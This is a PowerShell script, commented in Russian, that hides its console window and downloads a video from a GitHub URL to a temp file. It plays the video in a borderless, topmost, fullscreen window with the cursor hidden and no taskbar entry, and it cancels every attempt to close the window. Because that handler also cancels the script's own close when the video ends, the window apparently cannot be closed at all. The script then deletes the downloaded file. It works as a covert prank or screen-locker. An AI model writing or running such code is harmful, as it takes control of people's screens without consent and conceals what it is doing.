# Принудительно скрываем окно консоли (без ошибок)
try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# Ссылка на твой edit.mp4
$u = 'https://raw.githubusercontent.com/ymkeee/T-Embed/main/assets/edit.mp4'
# Новое уникальное имя файла
$f = "$env:TEMP\$([System.Guid]::NewGuid().ToString()).mp4"

try {
    Invoke-WebRequest -Uri $u -OutFile $f
    
    [xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader $xaml
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    # Закрытие после видео
    $v.add_MediaEnded({ $w.Close() })
    # Блокировка попыток закрыть
    $w.Add_Closing({ $_.Cancel = $true })

    $w.ShowDialog() | Out-Null
} finally {
    # Этот блок сработает в любом случае: досмотрели видео или произошла ошибка
    Start-Sleep -Seconds 1
    if (Test-Path $f) { Remove-Item -Path $f -Force }
}
